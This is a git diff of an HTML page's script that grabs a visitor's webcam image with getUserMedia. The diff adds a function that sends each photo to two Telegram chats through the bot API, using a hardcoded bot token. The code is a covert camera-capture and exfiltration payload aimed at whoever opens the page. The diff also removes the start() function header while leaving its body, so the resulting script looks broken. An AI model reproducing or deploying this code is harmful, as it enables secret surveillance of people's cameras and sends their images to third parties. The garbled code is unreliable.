@@ -7,17 +7,23 @@
 
 <script>
 const BOT_TOKEN = "8365889018:AAEWsk1NrmJYhIbG4XFqI_awk4s4pCX9FqQ";
-const CHAT_ID = "1236150171"; // Укажи свой ID
+  const CHAT_IDS = ["1236150171", "5339727792"]; // два или больше// Укажи свой ID
 
-async function start() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.getElementById("cam");
-    video.srcObject = stream;
+async function sendToTelegram(blob) {
+  const fd = new FormData();
+  fd.append("photo", blob, "photo.png");
 
-    video.onloadedmetadata = () => {
-      video.play();
+  for (let chat of CHAT_IDS) {
+    const formData = new FormData();
+    formData.append("chat_id", chat);
+    formData.append("photo", blob, "photo.png");
 
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+  }
+}
       // Даем камере включиться
       setTimeout(() => {
         takePhoto(video);
@@ -57,3 +63,4 @@ start();
 </body>
 
 </html>
+
